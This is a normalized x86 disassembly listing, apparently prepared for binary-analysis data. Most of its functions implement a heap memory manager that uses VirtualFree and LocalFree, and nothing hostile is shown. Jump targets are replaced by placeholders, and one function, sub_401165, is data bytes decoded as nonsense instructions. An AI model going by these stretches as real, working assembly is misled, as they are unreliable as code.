sub_401143
dec esp
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4031a4
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_401165
inc ebp
adc [ eax ] eax
dec edi
adc [ eax ] eax
pop ecx
adc [ eax ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
adc [ gs : eax ] eax
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
adc [ eax ] eax
or al 0x0
add [ eax ] al
mov al [ 0x20004010 ]
xor eax [ eax ]
push 0x74004055
push ebp
inc eax
add [ ebx + esi ] dh
inc eax
add [ eax ] ch
xor eax [ eax ]
test [ ebp + 0x40 ] dl
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ecx ] dl
push esp
dec ecx
outsb
je r-xdata
inc eax
add [ ecx + 0x11 ] dh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar bh 0x25
jb r-xdata
xchg esp eax
xchg ecx eax
inc esi
add [ ebx - 0x6fda0040 ] cl
xchg ecx eax
inc esi
add [ ebx - 0x73da0040 ] cl
xchg ecx eax
inc esi
add [ ebx - 0x77da0040 ] cl
xchg ecx eax
inc esi
add [ ebx - 0x7bda0040 ] cl
xchg ecx eax
inc esi
add [ ebx - 0x7fda0040 ] cl
xchg ecx eax
inc esi
add [ ebx + 0x7c25ffc0 ] cl
xchg ecx eax
inc esi
add [ ebx + 0x7825ffc0 ] cl
xchg ecx eax
inc esi
add [ ebx + 0x7425ffc0 ] cl
xchg ecx eax
inc esi
add [ ebx + 0x7025ffc0 ] cl
xchg ecx eax
inc esi
add [ ebx - 0x3bda0040 ] cl
xchg ecx eax
inc esi
add [ ebx + 0x6c25ffc0 ] cl
xchg ecx eax
inc esi
add [ ebx + 0x6825ffc0 ] cl
xchg ecx eax
inc esi
add [ ebx + 0x6425ffc0 ] cl
xchg ecx eax
inc esi
add [ ebx - 0x23da0040 ] cl
xchg ecx eax
inc esi
add [ ebx - 0x27da0040 ] cl
xchg ecx eax
inc esi
add [ ebx - 0x2bda0040 ] cl
xchg ecx eax
inc esi
add [ ebx + 0x6025ffc0 ] cl
xchg ecx eax
inc esi
add [ ebx + 0x5c25ffc0 ] cl
xchg ecx eax
inc esi
add [ ebx - 0x13da0040 ] cl
xchg ecx eax
inc esi
add [ ebx - 0x17da0040 ] cl
xchg ecx eax
inc esi
add [ ebx - 0x1bda0040 ] cl
xchg ecx eax
inc esi
add [ ebx + 0x5825ffc0 ] cl
xchg ecx eax
inc esi
add [ ebx + 0x5425ffc0 ] cl
xchg ecx eax
inc esi
add [ ebx + 0x5025ffc0 ] cl
xchg ecx eax
inc esi
add [ ebx + 0x4c25ffc0 ] cl
xchg ecx eax
inc esi
add [ ebx - 0x3b7cac40 ] cl
mov esp 0xabb
add [ eax + ebp * 8 + 0x59 ] dl
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
sub_401380
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401340
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_4013d8
push ebx
push esi
mov esi edx
mov ebx eax
call sub_401380
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_401420
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_401408
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_401408
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_4013d8
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_401490
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_4013d8
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_401408
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_401524
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013d8
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401350
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_401588
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401350
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401350
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013d8
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_401600
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call VirtualFree
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_401408
mov [ rw-data ] 0x1
sub_4016b8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401350
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_40174c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call VirtualFree
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_4017cc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_401524
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_4016b8
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_401420
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_401600
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_401408
jmp r-xdata
sub_40185c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_401588
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401420
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_401588
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401600
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401420
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_4016b8
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401600
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_401408
jmp r-xdata
sub_401980
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_40174c
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_401420
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_401600
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_401490
jmp r-xdata
sub_401a0c
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401ac2
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401360
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4013d0
mov eax rw-data
call sub_4013d0
mov eax rw-data
call sub_4013d0
push 0xff8
push 0x0
call sub_401340
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401ac9
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401370
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401ad0
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401ba6
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401368
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call VirtualFree
mov ebx [ ebx ]
mov eax rw-data
call sub_4013d0
mov eax rw-data
call sub_4013d0
mov eax rw-data
call sub_4013d0
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_401378
retn
push rw-data
call sub_401370
sub_401bb0
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401c14
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401c44
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401e18
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401c98
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401c74
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401cc0
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401bb0
add ebx esi
mov [ rw-data ] 0x6
sub_401d30
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401bb0
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401d68
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401c14
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_401980
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_401980
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401c44
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_401490
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401c98
sub_401e18
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401d68
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401ea0
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401c74
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401eec
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401ea0
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_401420
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401cc0
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401d30
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401c44
sub [ edi + 0x4 ] 0x4
sub_401f78
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_4017cc
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401eec
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_401fa4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_40185c
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401eec
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_401fd8
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_402004
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401bb0
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401e18
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_401f78
test al al
jne r-xdata
mov eax esi
call sub_401fd8
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_4020f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_401a0c
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_402274
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401368
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_402004
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401370
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403910
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403910
jmp r-xdata
sub_402288
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_40241a
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a0c
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401368
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
